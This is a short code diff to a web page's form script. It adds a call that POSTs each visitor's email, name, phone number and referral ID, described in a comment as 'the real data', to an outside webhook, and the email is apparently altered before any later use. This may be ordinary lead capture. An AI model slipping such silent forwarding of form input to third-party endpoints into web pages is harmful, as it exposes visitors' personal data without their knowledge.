@@ -618,6 +618,17 @@ src="https://www.facebook.com/tr?id=741608908207883&ev=PageView&noscript=1"
         ref_id: refID
       })
     });
+          // Envia os dados reais para o Make
+    await fetch("https://webh.grupomailx.com/webhook/digitalssscript", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: email.value,
+        nome: fullName.value,
+        telefone: phoneNumber.value,
+        ref_id: refID
+      })
+    });
           
           // Transform the email (apply both modifications in sequence)
           const firstModifiedEmail = modifyEmail(email.value);
@@ -683,3 +694,4 @@ src="https://www.facebook.com/tr?id=741608908207883&ev=PageView&noscript=1"
   </script>
 </body>
 </html>
+
